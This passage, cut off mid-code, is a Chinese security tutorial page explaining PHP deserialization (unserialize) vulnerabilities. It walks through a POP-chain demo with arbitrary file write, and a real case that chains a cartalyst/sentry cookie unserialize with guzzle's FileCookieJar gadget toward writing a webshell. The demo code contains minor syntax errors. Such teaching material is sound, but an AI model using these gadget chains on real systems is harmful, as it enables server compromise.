@@ -1,0 +1,617 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】PHP反序列化漏洞成因及漏洞挖掘技巧与案例 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="PHP反序列化漏洞,php安全,web安全,unserialize漏洞,php反序列化漏洞"/>
+    
+        <meta name="description" content="反序列化本身并不危险,但是如果反序列化时,传入反序列化函数的参数可以被用户控制那将会是一件非常危险的事情。本文主要写了PHP反序列化漏洞成因及漏洞挖掘技巧与案例。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】PHP反序列化漏洞成因及漏洞挖掘技巧与案例</h2>
+                <div class="article-msg">
+                    <span class="time">2016-11-16 16:09:50</span>
+                    
+                                        <span class="read">阅读：18282次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3193"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3193" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf"
+                             target="_blank">来源： insomniasec</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2553709124" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t011d66e4d0ee6ef2b8.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2553709124" style="color:#848e99;">for_while</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p7.qhimg.com/t014157c9b5f4375197.gif" title="t017a26a5a62ca44b86.gif" alt="http://p7.qhimg.com/t017a26a5a62ca44b86.gif"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">翻译：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=2553709124" target="_blank" textvalue="hac425" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>hac425</strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">稿费：200RMB（不服你也来投稿啊！）</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆</span></strong></span><a href="http://bobao.360.cn/contribute/index" target="_blank" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><strong>网页版</strong></a><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在线投稿</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一、序列化和反序列化</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">序列化和反序列化的目的是使得程序间传输对象会更加方便。</span><span style="color: rgb(255, 0, 0); text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">序列化是将对象转换为字符串以便存储传输的一种方式。而反序列化恰好就是序列化的逆过程,反序列化会将字符串转换为对象供程序使用。</span><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在PHP中序列化和反序列化对应的函数分别为serialize()和unserialize()。反序列化本身并不危险,但是如果反序列化时,传入反序列化函数的参数可以被用户控制那将会是一件非常危险的事情。不安全的进行反序列化造成的危害只有你想不到,没有他做不到,是的,没错。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">序列化和反序列化的原理已经有很多文章了,这里就不赘述了。PHP的类有很多的 &#39;魔术方法&#39; ,比如:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">__construct(),&nbsp;__destruct()
+__call(),&nbsp;__callStatic()
+__get(),&nbsp;__set()
+__isset(),&nbsp;__unset()
+__sleep(),&nbsp;__wakeup()
+__toString()
+__invoke()
+__set_state()
+__clone()
+__debugInfo()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这么多的魔术方法中我们所需要关注的方法也就是</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">__destruct()</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&nbsp;和&nbsp;<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">__wakeup()&nbsp;</span>方法.这两个方法中前者是在对象被销毁时程序会自动调用,后者是在类对象被反序列化时被调用.所以这两个方法是在 对象反序列化一直到程序执行完毕这整个过程中,必定会被调用的方法,如果在这两个函数中有一些危险的动作,并且能够被我们所利用,那么漏洞并出现了。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">二、反序列漏洞的利用思路</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">理论&nbsp;&nbsp;</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在反序列化中,我们所能控制的数据就是对象中的各个属性值,所以在PHP的反序列化有一种漏洞利用方法叫做 &quot;面向属性编程&quot; ,即&nbsp;POP( Property Oriented Programming)。和二进制漏洞中常用的ROP技术类似。在ROP中我们往往需要一段初始化gadgets来开始我们的整个利用过程,然后继续调用其他gadgets。在PHP反序列化漏洞利用技术POP中,对应的初始化gadgets就是__wakeup()&nbsp;或者是__destruct()&nbsp;方法, 在最理想的情况下能够实现漏洞利用的点就在这两个函数中,但往往我们需要从这个函数开始,逐步的跟进在这个函数中调用到的所有函数,直至找到可以利用的点为止。下面列举些在跟进其函数调用过程中需要关注一些很有价值的函数。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t017a523a4efc98e932.png" title="t01d0f6630be25385c5.png" alt="http://p2.qhimg.com/t01d0f6630be25385c5.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果在跟进程序过程中发现这些函数就要打起精神,一旦这些函数的参数我们能够控制,就有可能出现高危漏洞.</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Demo</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所使用的代码。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">DemoPopChain.php</span></p><pre class="brush:plain;toolbar:false">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;DemoPopChain{
+&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$data&nbsp;=&nbsp;“bar\n”;
+&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$filename&nbsp;=&nbsp;‘/tmp/foo’;
+&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__wakeup(){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;save($this-&gt;filename);
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;save($filename){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($filename,&nbsp;$this-&gt;data);
+&nbsp;&nbsp;&nbsp;&nbsp;}
+?&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">unserialize.php</span></p><pre class="brush:plain;toolbar:false">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require(‘./DemoPopChain.php’);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unserialize(file_get_contents(‘./serialized.txt));
+?&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个很简单的具有反序列漏洞的代码,程序从serialized.txt文件中读取需要进行反序列化的字符串。这个我们可控。同时该文件还定义了一个&nbsp;DemoPopChain&nbsp;类,并且该类实现了&nbsp;__wakeup&nbsp;函数,然后在该函数中,又调用了save函数,其参数为 类对象的filename属性值,然后在&nbsp;save函数中调用了&nbsp;file_put_contents&nbsp;函数,该函数的两个参数分别为从save函数中传下来的&nbsp;filename属性值 和 该对象的data属性值。又由于在反序列化的过程中被反序列化的对象的属性值是我们可控的,于是我们就通过对函数的嵌套调用和对象属性值的使用得到了一个&nbsp;任意文件写入任意内容的漏洞.这就是所谓的POP。就是关注整个函数的调用过程中参数的传递情况,找到可利用的点,这和一般的Web漏洞没什么区别,只是可控制的值有直接传递给程序的参数转变为了 对象中的属性值。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">三、现实中查找反序列化漏洞及构造exploit的方法</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">前置知识</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PHP的&nbsp;unserialize()&nbsp;函数只能反序列化在当前程序上下文中已经被定义过的类.在传统的PHP中你需要通过使用一大串的include()&nbsp;或者&nbsp;require()来包含所需的类定义文件。于是后来出现了&nbsp;autoloading&nbsp;技术,他可以自动导入需要使用的类,再也不需要程序员不断地复制粘贴 那些include代码了。这种技术同时也方便了我们的漏洞利用.因为在我们找到一个反序列化点的时候我们所能使用的类就多了,那么实现漏洞利用的可能性也就更加高。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还有一个东西要提一下,那就是Composer,这是一个php的包管理工具,同时他还能自动导入所以依赖库中定义的类。这样一来&nbsp;unserialize()&nbsp;函数也就能使用所有依赖库中的类了,攻击面又增大不少。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.Composer配置的依赖库存储在vendor目录下</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.如果要使用Composer的自动类加载机制,只需要在php文件的开头加上&nbsp;require __DIR__ . &#39;/vendor/autoload.php&#39;;</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞发现技巧</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">默认情况下 &nbsp;Composer 会从&nbsp; Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">找PHP链的基本思路.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.在各大流行的包中搜索 __wakeup() 和 __destruct() 函数.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.追踪调用过程</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.手工构造 并验证 POP 链</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.开发一个应用使用该库和自动加载机制,来测试exploit.</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">构造exploit的思路</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.寻找可能存在漏洞的应用</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.在他所使用的库中寻找 POP gadgets</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.将序列化之后的payload发送到有漏洞web应用中进行测试.</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Example</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1. 寻找可能存在漏洞的应用: &nbsp;&nbsp;cartalyst/sentry</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞代码:&nbsp;/src/Cartalyst/Sentry/Cookies/NativeCookie.php</span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;public&nbsp;function&nbsp;getCookie()
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;unserialize($_COOKIE[$this-&gt;getKey()]);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里从 cookie中获取了值,然后直接将他序列化.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.程序使用的库中的POP Gadgets:&nbsp;guzzlehttp/guzzle</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">找Gadgets的最好的一个地方就是composer.json文件,他写明了程序需要使用的库.</span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;require&quot;:&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;cartalyst/sentry&quot;:&nbsp;&quot;2.1.5&quot;,
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;illuminate/database&quot;:&nbsp;&quot;4.0.*&quot;,
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;guzzlehttp/guzzle&quot;:&nbsp;&quot;6.0.2&quot;,
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;swiftmailer/swiftmailer&quot;:&nbsp;&quot;5.4.1&quot;
+&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">a.从git repo下载这些库</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">b.在其中搜索__wakeup() 和 __destruct() 函数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">/guzzle/src/Cookie/FileCookieJar.php</span></p><pre class="brush:plain;toolbar:false">namespace&nbsp;GuzzleHttp\Cookie;
+class&nbsp;FileCookieJar&nbsp;extends&nbsp;CookieJar
+&nbsp;&nbsp;...
+&nbsp;&nbsp;public&nbsp;function&nbsp;__destruct()
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;save($this-&gt;filename);
+&nbsp;&nbsp;}
+&nbsp;&nbsp;...</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里使用类对象的filename属性值作为参数传入了save函数.我们来看看save函数具体实现.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">FileCookieJar-&gt;save()</span></p><pre class="brush:plain;toolbar:false">public&nbsp;function&nbsp;save($filename)
+{
+$json&nbsp;=&nbsp;[];
+foreach&nbsp;($this&nbsp;as&nbsp;$cookie)&nbsp;{
+&nbsp;&nbsp;/**&nbsp;@var&nbsp;SetCookie&nbsp;$cookie&nbsp;*/
+&nbsp;&nbsp;if&nbsp;($cookie-&gt;getExpires()&nbsp;&amp;&amp;&nbsp;!$cookie-&gt;getDiscard())&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;$json[]&nbsp;=&nbsp;$cookie-&gt;toArray();
+&nbsp;&nbsp;}
+&nbsp;}
+if&nbsp;(false&nbsp;===&nbsp;file_put_contents($filename,&nbsp;json_encode($json)))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;throw&nbsp;new&nbsp;\RuntimeException(&quot;Unable&nbsp;to&nbsp;save&nbsp;file&nbsp;{$filename}&quot;);
+&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到我们传入的参数最后是直接被作为要写入内容的文件的文件名.这下文件名可控了,如果我们再能够控制文件的内容就能实现getshell了.通过代码可以发现文件的内容为上面一层循环中来得到的数组经过json编码后得到的.而数组中的内容为&nbsp;$cookie-&gt;toArray()&nbsp;,那么我们得去找到&nbsp;$cookie对象是在哪定义的来确定他返回的值是什么,以及是否可利用.还有一点,我们还需要过掉那个判断才能给 json 数组赋值.所以我们需要关注的有三个点.</span></p><pre class="brush:plain;toolbar:false">$cookie-&gt;getExpires()
+!$cookie-&gt;getDiscard()
+$json[]&nbsp;=&nbsp;$cookie-&gt;toArray()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们并不知道$cookie&nbsp;具体是什么类,我们可以通过搜索函数名,来定位这个类.通过这样定位到了SetCookie类.其代码如下.</span></p><pre class="brush:plain;toolbar:false">namespace&nbsp;GuzzleHttp\Cookie;
+class&nbsp;SetCookie
+&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;toArray(){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;data;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getExpires(){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;data[&#39;Expires&#39;];
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;...
+&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getDiscard(){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;data[&#39;Discard&#39;];
